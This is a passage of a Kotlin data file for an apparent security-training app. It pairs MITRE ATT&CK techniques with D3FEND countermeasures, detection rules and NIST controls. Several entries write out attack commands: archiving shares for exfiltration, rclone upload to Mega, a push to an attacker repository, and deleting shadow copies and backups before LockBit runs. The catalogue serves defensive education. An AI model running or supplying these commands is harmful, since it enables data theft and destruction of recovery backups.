            d3fendDescription = "Disable SMBv1, enforce SMB Signing, and restrict lateral SMB traffic between workstation subnets using host-based firewalls.",
            d3fendRuleOrFix = """
# Windows Firewall Rule: Block Inbound SMB (Port 445) Between Workstations
New-NetFirewallRule -DisplayName "Block Workstation SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -RemoteAddress WorkstationSubnet
            """.trimIndent(),
            knownAptGroups = listOf("FIN6", "NotPetya", "LockBit"),
            tags = listOf("LateralMovement", "PsExec", "SMB", "AdminShares", "WinRM"),
            nistControls = listOf(
                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Isolate workstation subnets and block lateral port 445/SMB traffic.", "Enforce Windows Host Firewall rules blocking peer-to-peer SMB connection attempts.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control",
                stageNumber = 6,
                description = "Pivoting across enterprise network subnets to reach target database servers and domain controllers.",
                scenarioExample = "NotPetya malware propagated automatically across subnets using PsExec and stolen Administrator tokens via SMB shares."
            )
        ),

        // ==================== 11. COLLECTION (TA0009) ====================
        MitreTtpItem(
            techniqueId = "T1560",
            name = "Archive Collected Data: Archive via Utility",
            tactic = MitreTactic.COLLECTION,
            subTechnique = "T1560.001",
            subTechniquesList = listOf(
                SubTechniqueItem("T1560.001", "Archive via Utility", "Compressing targeted intellectual property into password-protected RAR or 7z archives.", "7z a -p'secret' exfil.7z C:\\SensitiveDocs\\*"),
                SubTechniqueItem("T1560.002", "Archive via Library", "Utilizing built-in Python or PowerShell compression libraries.", "Compress-Archive -Path C:\\Docs -DestinationPath exfil.zip")
            ),
            description = "Adversaries compress and encrypt harvested sensitive documents, database dumps, and emails into password-protected archive files (ZIP, 7z, RAR) prior to exfiltration.",
            attackExampleTitle = "Password-Protected 7-Zip Staging of Sensitive Corporate Files",
            attackCodeCommand = """
7z.exe a -hp"CyberExfil2026!" -mhe=on C:\Users\Public\exfil_staging.7z C:\Share\Finance\* C:\Share\IP\*
            """.trimIndent(),
            d3fendId = "D3-DLP",
            d3fendName = "Data Loss Prevention (DLP) & File Archive Content Inspection",
            d3fendDescription = "Deploy endpoint DLP controls to monitor creation of large encrypted archives in temp directories.",
            d3fendRuleOrFix = """
# Endpoint DLP Policy Rule: Alert on 7z / RAR archives created in Public directories > 50MB
Set-DLPPolicy -Name "BlockEncryptedArchiveStaging" -MinSizeMB 50 -FileExtension "7z","rar" -Action AuditAndNotify
            """.trimIndent(),
            knownAptGroups = listOf("Lazarus Group", "FIN7", "BlackCat"),
            tags = listOf("Collection", "Archive", "7Zip", "Staging", "DLP"),
            nistControls = listOf(
                NistControlMapping("PR.DS-1", "Data Security", "Protect (PR) / Data Protection", "Implement Data Loss Prevention (DLP) controls to audit archive creation containing sensitive enterprise data.", "Configure Endpoint DLP alerts on 7z/RAR file staging exceeding 50MB.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 7: Actions on Objectives",
                stageNumber = 7,
                description = "Aggregating and compressing enterprise assets prior to external data exfiltration.",
                scenarioExample = "BlackCat ransomware operators staged 100GB of confidential design files into password-protected 7z archives prior to exfiltration via Rclone."
            )
        ),

        // ==================== 12. COMMAND AND CONTROL (TA0011) ====================
        MitreTtpItem(
            techniqueId = "T1071",
            name = "Application Layer Protocol: Web Protocols",
            tactic = MitreTactic.COMMAND_AND_CONTROL,
            subTechnique = "T1071.001",
            subTechniquesList = listOf(
                SubTechniqueItem("T1071.001", "Web Protocols", "Tunneling C2 traffic over encrypted HTTPS requests.", "Cobalt Strike malleable C2 profile over HTTP/S"),
                SubTechniqueItem("T1071.004", "DNS Protocols", "Exfiltrating data and receiving commands via DNS TXT query tunneling.", "dnscat2 / iodine DNS tunnel")
            ),
            description = "Adversaries communicate with compromised endpoints over standard HTTPS web traffic, hiding beaconing heartbeats inside standard HTTP GET/POST requests.",
            attackExampleTitle = "Cobalt Strike Malleable C2 Beaconing over HTTPS",
            attackCodeCommand = """
./teamserver 192.168.1.100 "SecretPass123" /opt/cobaltstrike/malleable_c2_jquery.profile
            """.trimIndent(),
            d3fendId = "D3-TLS",
            d3fendName = "SSL/TLS Decryption & JA3/JA3S Fingerprint Inspection",
            d3fendDescription = "Deploy outbound SSL Decryption proxies and inspect TLS Client Hello fingerprints (JA3) against known Cobalt Strike beacon signatures.",
            d3fendRuleOrFix = """
# Suricata IDS Rule: Detect Cobalt Strike Default TLS JA3 Fingerprint
alert tls ${'$'}HOME_NET any -> ${'$'}EXTERNAL_NET 443 (msg:"ET PRO CobaltStrike TLS JA3 Fingerprint Detected"; ja3.hash:"72a589da586844d7f0818ce684948eea"; sid:2030001; rev:1;)
            """.trimIndent(),
            knownAptGroups = listOf("APT29", "FIN7", "Cobalt Group"),
            tags = listOf("C2", "CobaltStrike", "HTTPS", "JA3", "Beaconing"),
            nistControls = listOf(
                NistControlMapping("SC-7", "Boundary Protection", "Protect (PR) / Communications", "Inspect encrypted egress communications for unauthorized C2 channels.", "Deploy TLS outbound decryption proxies with Suricata JA3 fingerprint matching.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control",
                stageNumber = 6,
                description = "Establishing persistent, encrypted command channels between victim host and remote adversary infrastructure.",
                scenarioExample = "APT29 configured Cobalt Strike beacons with malleable HTTP profiles mimicking Google Analytics traffic to blend into corporate egress traffic."
            )
        ),

        // ==================== 13. EXFILTRATION (TA0010) ====================
        MitreTtpItem(
            techniqueId = "T1567",
            name = "Exfiltration Over Web Service: Exfiltration to Cloud Storage",
            tactic = MitreTactic.EXFILTRATION,
            subTechnique = "T1567.002",
            subTechniquesList = listOf(
                SubTechniqueItem("T1567.001", "Exfiltration to Code Repository", "Uploading confidential source code to public GitHub repositories.", "git push https://github.com/attacker/stolen-code.git"),
                SubTechniqueItem("T1567.002", "Exfiltration to Cloud Storage", "Transferring archived datasets to cloud buckets (AWS S3, Mega.nz, Dropbox) via Rclone.", "rclone copy C:\\exfil_staging.7z mega:stolen_data")
            ),
            description = "Adversaries transmit compressed archives to external cloud storage providers (Mega.nz, AWS S3, Google Drive) using automated utilities like Rclone.",
            attackExampleTitle = "Rclone Data Exfiltration to Remote Mega.nz Cloud Account",
            attackCodeCommand = """
rclone.exe copy C:\Users\Public\exfil_staging.7z remote_mega:TargetExfilData --bwlimit 5M --transfers 4
            """.trimIndent(),
            d3fendId = "D3-CASB",
            d3fendName = "Cloud Access Security Broker (CASB) & Outbound Cloud Block",
            d3fendDescription = "Enforce CASB cloud inline inspection to block unauthorized cloud API storage endpoints (Mega.nz, Dropbox, Personal S3).",
            d3fendRuleOrFix = """
# Zscaler SWG Policy: Block Unauthorized Cloud Storage Uploads
Set-SWGPolicy -Category "Cloud Storage / File Host" -Action Block -AllowList "EnterpriseS3Bucket"
            """.trimIndent(),
            knownAptGroups = listOf("Lazarus Group", "BlackCat", "LockBit"),
            tags = listOf("Exfiltration", "Rclone", "CloudStorage", "Mega", "CASB"),
            nistControls = listOf(
                NistControlMapping("SC-28", "Protection of Information at Rest/Transit", "Protect (PR) / Data Security", "Restrict egress network bandwidth and prevent unauthorized transfers to unapproved cloud storage providers.", "Enforce CASB tenant isolation blocking non-corporate cloud storage endpoints.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 7: Actions on Objectives",
                stageNumber = 7,
                description = "Exfiltrating sensitive enterprise data to adversary-controlled cloud accounts.",
                scenarioExample = "LockBit operators exfiltrated 500GB of proprietary engineering schematics to Mega.nz using Rclone prior to deploying ransomware encrypters."
            )
        ),

        // ==================== 14. IMPACT (TA0040) ====================
        MitreTtpItem(
            techniqueId = "T1486",
            name = "Data Encrypted for Impact: Ransomware Execution",
            tactic = MitreTactic.IMPACT,
            subTechnique = "T1486",
            subTechniquesList = listOf(
                SubTechniqueItem("T1486.001", "Symmetric Encryption", "Encrypting files locally using AES-256 keys.", "LockBit ransomware encrypting local drives"),
                SubTechniqueItem("T1486.002", "Volume Shadow Copy Deletion", "Destroying Windows VSS backup snapshots to prevent local recovery.", "vssadmin delete shadows /all /quiet")
            ),
            description = "Adversaries execute ransomware payloads to encrypt local files, volume shadow copies, and network shares, demanding ransom payments for decryption keys.",
            attackExampleTitle = "VSS Snapshot Destruction & LockBit Ransomware Execution",
            attackCodeCommand = """
vssadmin.exe delete shadows /all /quiet
wbadmin.exe delete catalog -quiet
wmic.exe shadowcopy delete
LockBit.exe -pass "Key123" -m -g
            """.trimIndent(),
            d3fendId = "D3-RWD",
            d3fendName = "Ransomware Behavioral Canary Protection & Anti-Ransomware Shield",
            d3fendDescription = "Deploy EDR behavioral anti-ransomware rules that automatically freeze processes attempting mass file modification or VSS deletion.",
            d3fendRuleOrFix = """
# Defender for Endpoint Attack Surface Reduction (ASR) Rule
Set-MpPreference -AttackSurfaceReductionRules_Ids 92e5811a-6613-4225-a3a0-230f7f239980 -AttackSurfaceReductionRules_Actions Enabled
            """.trimIndent(),
            knownAptGroups = listOf("LockBit", "Conti", "BlackCat", "REvil"),
            tags = listOf("Impact", "Ransomware", "Encryption", "VSS", "LockBit"),
            nistControls = listOf(
                NistControlMapping("CP-9", "Information System Backups", "Recover (RC) / Contingency Planning", "Maintain immutable, air-gapped backups to restore operations after ransomware incidents.", "Deploy immutable AWS S3 Object Lock backups and offline tape storage.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 7: Actions on Objectives",
                stageNumber = 7,
                description = "Causing business disruption and financial damage through irreversible mass file encryption.",
                scenarioExample = "LockBit ransomware encrypted over 2,000 servers within 30 minutes after destroying shadow copies via vssadmin."
            )
        )
    )

    val allD3fendItems: List<MitreD3fendItem> = listOf(
        // ==================== 1. MODEL (D3-TACTIC-MODEL) ====================
        MitreD3fendItem(
            d3fendId = "D3-AM",
            name = "Asset Mapping & Configuration Inventory",
            tactic = MitreDefendTactic.MODEL,
            description = "Continuously discover, catalog, and map enterprise hardware assets, cloud instances, and software dependencies.",
            ruleOrFix = """
# AWS Config Rule: Audit Unmapped / Untagged EC2 Instances
{
  "ConfigRuleName": "RequiredTagsCheck",
  "Source": {
    "Owner": "AWS",
    "SourceIdentifier": "REQUIRED_TAGS"
  }
}
            """.trimIndent(),
            counteredAttackIds = listOf("T1595", "T1590"),
            tags = listOf("Model", "AssetInventory", "AWSConfig"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-AM.1", "Host Discovery Mapping", "Automated network discovery mapping of active IPs.", "nmap -sn 10.0.0.0/16"),
                SubTechniqueItem("D3-AM.2", "Software Inventory Verification", "Auditing installed software catalog against authorized baseline.", "Querying EDR software inventory database")
            ),
            nistControls = listOf(
                NistControlMapping("ID.AM-1", "Asset Management", "Identify (ID) / Inventory", "Maintain an accurate inventory of physical devices and systems within the organization.", "Deploy automated cloud asset discovery via AWS Config and Microsoft Intune.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 1: Reconnaissance Defense",
                stageNumber = 1,
                description = "Denying adversary visibility into unmapped perimeter servers.",
                scenarioExample = "Enterprise defenders utilized automated asset inventory tools to identify and decommission rogue development servers before adversaries discovered them."
            )
        ),

        // ==================== 2. HARDEN (D3-TACTIC-HARDEN) ====================
        MitreD3fendItem(
            d3fendId = "D3-LSA",
            name = "LSASS Protection & LSA Protected Mode (RunAsPPL)",
            tactic = MitreDefendTactic.HARDEN,
            description = "Harden local credential stores by enforcing LSA Protection mode and enabling Credential Guard.",
            ruleOrFix = """
# Enable LSA Protected Mode in Windows Registry
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
            """.trimIndent(),
            counteredAttackIds = listOf("T1003"),
            tags = listOf("Harden", "RunAsPPL", "LSASS", "CredentialGuard"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-LSA.1", "Virtualization-Based Security", "Isolating Kerberos tickets in hypervisor-protected memory.", "Enable Windows Credential Guard via GPO"),
                SubTechniqueItem("D3-LSA.2", "Process Handle Restriction", "Restricting process handle permissions to LSASS.", "Block ProcessAccess permissions to lsass.exe via Sysmon")
            ),
            nistControls = listOf(
                NistControlMapping("PR.AC-1", "Access Control & Credential Protection", "Protect (PR) / Access Control", "Enforce hardware-enforced credential protection mechanisms.", "Enable LSA Protected Mode and Credential Guard across enterprise workstations.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control Defense",
                stageNumber = 6,
                description = "Blocking adversary attempts to extract LSASS memory credentials.",
                scenarioExample = "Enforcing RunAsPPL prevented Mimikatz from opening a memory handle to LSASS during an active ransomware intrusion."
            )
        ),

        // ==================== 3. DETECT (D3-TACTIC-DETECT) ====================
        MitreD3fendItem(
            d3fendId = "D3-NTA",
            name = "Network Traffic Pattern Analysis & Behavioral Anomaly Detection",
            tactic = MitreDefendTactic.DETECT,
            description = "Analyze NetFlow telemetry, HTTP/S requests, and DNS query bursts to identify adversary scanning and C2 beaconing.",
            ruleOrFix = """
# Zeek / Bro Script: Detect High-Frequency HTTP Scanner Request Bursts
event http_request(c: connection, method: string, URI: string) {
    if ( c${'$'}http${'$'}num_requests > 100 )
        NOTICE([${'$'}note=HTTP::Scanner_Burst, ${'$'}msg="Possible automated scanner"]);
}
            """.trimIndent(),
            counteredAttackIds = listOf("T1595", "T1071", "T1567"),
            tags = listOf("Detect", "NetFlow", "Zeek", "NTA"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-NTA.1", "NetFlow Telemetry Inspection", "Analyze IPFIX and NetFlow records for anomalous volume spikes.", "Flowmon NetFlow analyzer"),
                SubTechniqueItem("D3-NTA.2", "JA3 TLS Fingerprinting", "Match TLS Client Hello hashes against Cobalt Strike beacon profiles.", "Suricata JA3 match rules")
            ),
            nistControls = listOf(
                NistControlMapping("DE.CM-1", "Continuous Monitoring", "Detect (DE) / Detection", "Monitor network communications for unauthorized activities and anomaly bursts.", "Deploy Zeek network security monitoring across all internet egress points.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control Defense",
                stageNumber = 6,
                description = "Detecting automated C2 beacon heartbeats traversing HTTPS egress proxies.",
                scenarioExample = "Suricata JA3 fingerprint rules alerted SOC analysts to an active Cobalt Strike beacon channel within 5 minutes of initial execution."
            )
        ),

        // ==================== 4. ISOLATE (D3-TACTIC-ISOLATE) ====================
        MitreD3fendItem(
            d3fendId = "D3-SMB",
            name = "SMB Micro-segmentation & Lateral Movement Restriction",
            tactic = MitreDefendTactic.ISOLATE,
            description = "Isolate workstation subnets and enforce host firewall rules preventing lateral SMB connection attempts.",
            ruleOrFix = """
# PowerShell Host Firewall Rule: Block Workstation-to-Workstation Port 445
New-NetFirewallRule -DisplayName "Block Workstation SMB Inbound" -Direction Inbound -LocalPort 445 -Protocol TCP -Action Block -RemoteAddress 10.10.0.0/16
            """.trimIndent(),
            counteredAttackIds = listOf("T1021"),
            tags = listOf("Isolate", "SMB", "Microsegmentation", "Firewall"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-SMB.1", "Port 445 Workstation Block", "Dropping inbound SMB traffic between non-server IP ranges.", "Windows Firewall inbound block rule"),
                SubTechniqueItem("D3-SMB.2", "Admin Share Restriction", "Disabling default ADMIN$ and C$ shares on user endpoints.", "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters /v AutoShareWks /t REG_DWORD /d 0")
            ),
            nistControls = listOf(
                NistControlMapping("PR.AC-5", "Network Separation", "Protect (PR) / Network Separation", "Segment internal networks to prevent uncontrolled lateral movement.", "Deploy micro-segmentation policies restricting SMB traffic to designated management servers.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control Defense",
                stageNumber = 6,
                description = "Containing adversary lateral movement within a single isolated VLAN.",
                scenarioExample = "Enforcing SMB micro-segmentation prevented NotPetya malware from spreading beyond the initial weaponized host."
            )
        ),

        // ==================== 5. DECEIVE (D3-TACTIC-DECEIVE) ====================
        MitreD3fendItem(
            d3fendId = "D3-ADC",
            name = "Active Directory Canary Honeytokens & Decoy Accounts",
            tactic = MitreDefendTactic.DECEIVE,
            description = "Deploy attractive decoy accounts and Kerberos tickets in Active Directory to trigger immediate high-priority alerts upon adversary enumeration.",
            ruleOrFix = """
# SIEM Alert: Detect LDAP Query targeting Canary Honeytoken "svc_admin_canary"
index=winlogbeat EventCode=4662 Properties="*svc_admin_canary*"
            """.trimIndent(),
            counteredAttackIds = listOf("T1087", "T1003"),
            tags = listOf("Deceive", "Canary", "Honeytoken", "ActiveDirectory"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-ADC.1", "Canary User Accounts", "Creating decoy Domain Admin accounts with active monitoring.", "Active Directory account 'admin_canary'"),
                SubTechniqueItem("D3-ADC.2", "Fake SPN Kerberoasting Traps", "Configuring fake Service Principal Names (SPNs) with weak passwords to catch Kerberoasting.", "Set-ADUser -Identity canary_spn -ServicePrincipalNames 'MSSQL/canary'")
            ),
            nistControls = listOf(
                NistControlMapping("DE.DP-1", "Detection Processes", "Detect (DE) / Deception", "Deploy deceptive artifacts to catch stealthy adversary internal discovery.", "Deploy Active Directory honeytoken accounts monitored by SIEM real-time alerts.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 6: Command & Control Defense",
                stageNumber = 6,
                description = "Trapping adversaries during Active Directory Kerberoasting and account discovery.",
                scenarioExample = "An adversary executing BloodHound triggered an immediate SIEM alert upon querying a planted canary Domain Admin account."
            )
        ),

        // ==================== 6. EVICT (D3-TACTIC-EVICT) ====================
        MitreD3fendItem(
            d3fendId = "D3-RWD",
            name = "Automated Endpoint Process Eviction & Isolation",
            tactic = MitreDefendTactic.EVICT,
            description = "Automatically terminate malicious execution threads, revoke compromised user session tokens, and isolate compromised endpoints from the network.",
            ruleOrFix = """
# Defender for Endpoint Automated Investigation & Response (AIR)
Set-MpPreference -EnableNetworkProtection Enabled -SubmitSamplesConsent 1
            """.trimIndent(),
            counteredAttackIds = listOf("T1486", "T1059", "T1068"),
            tags = listOf("Evict", "EDR", "ProcessKill", "NetworkIsolation"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-RWD.1", "Automated Process Termination", "Freezing and terminating malicious execution threads instantly.", "EDR process termination trigger"),
                SubTechniqueItem("D3-RWD.2", "Network Session Revocation", "Disconnecting compromised endpoint from network VLAN.", "Automated switch port shutdown via RADIUS")
            ),
            nistControls = listOf(
                NistControlMapping("RS.RP-1", "Response Execution", "Respond (RS) / Containment", "Execute containment actions to isolate compromised hosts and terminate malicious execution.", "Enable EDR Automated Response to isolate ransomware-infected hosts within 30 seconds.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 7: Actions on Objectives Defense",
                stageNumber = 7,
                description = "Evicting the adversary before ransomware encryption or data exfiltration is completed.",
                scenarioExample = "Automated EDR containment rules severed network connectivity and killed process handles within 20 seconds of LockBit execution."
            )
        ),

        // ==================== 7. RESTORE (D3-TACTIC-RESTORE) ====================
        MitreD3fendItem(
            d3fendId = "D3-RSP",
            name = "System Restore & Immutable Snapshot Recovery",
            tactic = MitreDefendTactic.RESTORE,
            description = "Enforce automated system state restoration and immutable, air-gapped backup snapshot recovery to restore operational integrity following destructive attacks.",
            ruleOrFix = """
# AWS Backup Vault Lock: Enforce WORM (Write Once Read Many) Immutable Backups
aws backup put-backup-vault-lock-configuration \
  --backup-vault-name ProductionAirGapVault \
  --min-retention-days 30
            """.trimIndent(),
            counteredAttackIds = listOf("T1486", "T1490"),
            tags = listOf("Restore", "VSS", "ImmutableBackup", "Recovery"),
            subTechniquesList = listOf(
                SubTechniqueItem("D3-RSP.1", "Immutable Cloud Snapshot Verification", "Automated validation of air-gapped AWS Backup vault policies.", "AWS Backup Audit Manager rule"),
                SubTechniqueItem("D3-RSP.2", "Automated VSS System Rollback", "Reverting local OS state to a known-good shadow copy.", "rstrui.exe /OFFLINE:C:\\Windows")
            ),
            nistControls = listOf(
                NistControlMapping("CP-9", "Information System Backup", "Recover (RC) / System Backups", "Conduct periodic testing of air-gapped backup media and enforce Write-Once-Read-Many (WORM) storage integrity.", "Enforce AWS Backup Vault Lock with compliance mode WORM protection.")
            ),
            cyberKillChain = CyberKillChainInfo(
                stage = "Stage 7: Recovery",
                stageNumber = 7,
                description = "Restoring business operations rapidly without paying adversary extortion demands.",
                scenarioExample = "Following a ransomware attack, defenders restored 50 TB of critical domain controllers from WORM-locked cloud snapshots within 4 hours."
            )
        )
    )

    fun getTtpsByTactic(tactic: MitreTactic): List<MitreTtpItem> {
        return allTtps.filter { it.tactic == tactic }
    }

    fun getD3fendByTactic(tactic: MitreDefendTactic): List<MitreD3fendItem> {
        return allD3fendItems.filter { it.tactic == tactic }
    }

    fun filterTtps(query: String = "", tactic: MitreTactic? = null): List<MitreTtpItem> {
        val q = query.trim().lowercase()
        return allTtps.filter { ttp ->
            val matchesTactic = tactic == null || ttp.tactic == tactic
            val matchesQuery = q.isEmpty() ||
                    ttp.techniqueId.lowercase().contains(q) ||
                    ttp.name.lowercase().contains(q) ||
                    ttp.description.lowercase().contains(q) ||
                    ttp.d3fendId.lowercase().contains(q) ||
                    ttp.d3fendName.lowercase().contains(q) ||
                    ttp.knownAptGroups.any { it.lowercase().contains(q) } ||
                    ttp.tags.any { it.lowercase().contains(q) }
            matchesTactic && matchesQuery
        }
    }
}
